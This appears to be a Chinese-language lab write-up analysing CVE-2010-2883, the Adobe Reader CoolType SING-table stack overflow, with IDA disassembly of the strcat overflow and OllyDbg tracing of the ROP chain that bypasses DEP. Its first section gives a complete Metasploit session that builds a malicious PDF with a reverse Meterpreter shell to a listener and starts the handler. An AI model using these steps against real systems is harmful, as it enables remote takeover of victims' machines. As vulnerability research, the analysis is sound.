---
title: CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞
date: 2020-12-12
tags: 漏洞分析
---

## 一、调试环境

windows xp sp3中文版

Adobe Reader (9.3.4)

Ollydbg

IDA Pro

010editor

## 二、漏洞分析

### 1.样本构造

使用msf生成样本并设置监听程序：

```shell
msf5 > search cve-2010-2883

Matching Modules
================

   #  Name                                            Disclosure Date  Rank   Check  Description
   -  ----                                            ---------------  ----   -----  -----------
   0  exploit/windows/browser/adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow
   1  exploit/windows/fileformat/adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table "uniqueName" Stack Buffer Overflow
msf5 > use exploit/windows/fileformat/adobe_cooltype_sing
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > options                                 Module options (exploit/windows/fileformat/adobe_cooltype_sing):           
   Name      Current Setting  Required  Description                         
   ----      ---------------  --------  -----------                    
   FILENAME  msf.pdf          yes       The file name.                                   
   Exploit target:                                                               
   Id  Name                                       
   --  ----                                      
   0   Automatic                                                   
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > set payload windows/meterpreter/reverse_tcp                                                  
payload => windows/meterpreter/reverse_tcp 
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > options
Module options (exploit/windows/fileformat/adobe_cooltype_sing):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   FILENAME  msf.pdf          yes       The file name.
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

   **DisablePayloadHandler: True   (no handler will be created!)**
Exploit target:
   Id  Name
   --  ----
   0   Automatic
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > set LHOST 192.168.110.142
LHOST => 192.168.110.142
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > set filename msf4444.pdf
filename => msf4444.pdf
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > exploit 
[*] Creating 'msf4444.pdf' file...
[+] msf4444.pdf stored at /home/kali/.msf4/local/msf4444.pdf
msf5 exploit(windows/fileformat/adobe_cooltype_sing) > back
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > options 
Module options (exploit/multi/handler):
   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST                      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port
Exploit target:
   Id  Name
   --  ----
   0   Wildcard Target
   
msf5 exploit(multi/handler) > set LHOST 192.168.110.142
LHOST => 192.168.110.142
msf5 exploit(multi/handler) > exploit

```

反弹shell成功：

![](./反弹shell.png)

![](./反弹shell2.png)

表明样本构造成功：

### 2.样本行为分析

使用Process Monitor开启程序的监控，分析样本行为。这里我们主要检测其网络行为。我们发现其与192.168.110.142的地址通过4444端口进行tcp通信：

![](./行为分析.png)

### 3.静态分析

基于前人的探索，我们可以直接定位到漏洞位置；IDA Pro反汇编CoolType.dll库，搜索“SING”字符串，定位到下图位置：

![](./SING.png)

```assembly
.text:0803DCF9                 push    ebp
.text:0803DCFA                 sub     esp, 104h       ; 分配栈空间0x104
.text:0803DD00                 lea     ebp, [esp-4]    ; strcat的dest
.text:0803DD04                 mov     eax, ___security_cookie
.text:0803DD09                 xor     eax, ebp
.text:0803DD0B                 mov     [ebp+108h+var_4], eax
.text:0803DD11                 push    4Ch
.text:0803DD13                 mov     eax, offset sub_8184A54
.text:0803DD18                 call    __EH_prolog3_catch
.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]
.text:0803DD23                 mov     edi, [ebp+108h+arg_0]
.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]
.text:0803DD2F                 mov     [ebp+108h+var_130], edi
.text:0803DD32                 mov     [ebp+108h+var_138], eax
.text:0803DD35                 call    sub_804172C
.text:0803DD3A                 xor     esi, esi
.text:0803DD3C                 cmp     dword ptr [edi+8], 3
.text:0803DD40                 mov     [ebp+108h+var_10C], esi
.text:0803DD43                 jz      loc_803DF00
.text:0803DD49                 mov     [ebp+108h+var_124], esi
.text:0803DD4C                 mov     [ebp+108h+var_120], esi
.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1
.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1
.text:0803DD57                 jnz     loc_803DEA9
.text:0803DD5D                 push    offset aName    ; "name"
.text:0803DD62                 push    edi             ; int
.text:0803DD63                 lea     ecx, [ebp+108h+var_124]
.text:0803DD66                 mov     [ebp+108h+var_119], 0
.text:0803DD6A                 call    sub_80217D7
.text:0803DD6F                 cmp     [ebp+108h+var_124], esi
.text:0803DD72                 jnz     short loc_803DDDD
.text:0803DD74                 push    offset aSing    ; "SING"
.text:0803DD79                 push    edi             ; int
.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C] ; SING表的入口地址
.text:0803DD7D                 call    sub_8021B06
.text:0803DD82                 mov     eax, [ebp+108h+var_12C] ; SING表的入口处的值
.text:0803DD85                 cmp     eax, esi        ; 判断是否为NULL
.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2
.text:0803DD8B                 jz      short loc_803DDC4 ; 为空则跳转
.text:0803DD8D                 mov     ecx, [eax] ;字体版本资源号，这里是1.0版本，即00 10 00 00
.text:0803DD8F                 and     ecx, 0FFFFh
.text:0803DD95                 jz      short loc_803DD9F ; 发生跳转
.text:0803DD97                 cmp     ecx, 100h
.text:0803DD9D                 jnz     short loc_803DDC0
.text:0803DD9F
.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj
.text:0803DD9F                 add     eax, 10h
.text:0803DDA2                 push    eax             ; char *src
.text:0803DDA3                 lea     eax, [ebp+108h+var_108]
.text:0803DDA6                 push    eax             ; char *dest
.text:0803DDA7                 mov     [ebp+108h+var_108], 0
.text:0803DDAB                 call    strcat          ; 造成溢出
```

### 4.动态分析

使用Olldbg attach到Adobe Reader进程，寻找CoolType.dll中的位置在下图所示位置：

![](./OD1.png)

注意这里，之前断点一直没有触发，在网上找了好久，才找到如下解决方法：

![](./OD2.png)

打开样本触发断点：

![](./OD4.png)

继续执行，到造成溢出处断下，数据拷贝方向如下：

![](./OD5.png)

f8执行，栈空间已被覆盖：

![](./OD6.png)

参考漏洞战争，在这下个断点：

![](./OD7.png)

f7单步步入，在此处返回，ROP指令1：

![](./OD8.png)

ROP指令2：

![](./ROP1.png)

ROP指令3：

![](./ROP2.png)

ROP指令4：

![](./ROP4.png)

通过分析栈空间内容，可以分析处样本通过ROP技术调用了CreateFileA();

CreateFileMapping();

MapViewOfFile();

memcpy()

等一系列函数来绕过DEP保护。

![](./Createfile.png)
